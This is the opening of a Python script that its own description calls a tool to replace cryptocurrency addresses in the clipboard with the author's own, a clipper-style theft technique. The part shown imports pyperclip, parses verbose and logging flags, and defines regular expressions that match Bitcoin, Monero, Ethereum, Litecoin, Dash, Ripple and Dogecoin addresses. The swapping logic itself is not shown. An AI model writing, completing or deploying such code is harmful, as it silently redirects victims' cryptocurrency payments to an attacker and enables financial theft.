import pyperclip
import re
import argparse
import json
import time
import sys
import pprint
from datetime import datetime

parser = argparse.ArgumentParser(
    description="Replace crypto addresses in clipboard with your own"
)
parser.add_argument("--verbose", help="Get more details", action="store_true")
parser.add_argument("--log", help="Log actions to log.txt", action="store_true")
args = parser.parse_args()

# name of crypto matched to regex to find it.
cryptos = {
    "legacy_btc": "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
    "segwit_btc": "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
    "xmr": "4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz]{93}",
    "eth": "^0x[a-fA-F0-9]{40}$",
    "lite": "^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$",
    "dash": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
    "ripple": "^r[0-9a-zA-Z]{24,34}$",
    "doge": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
}

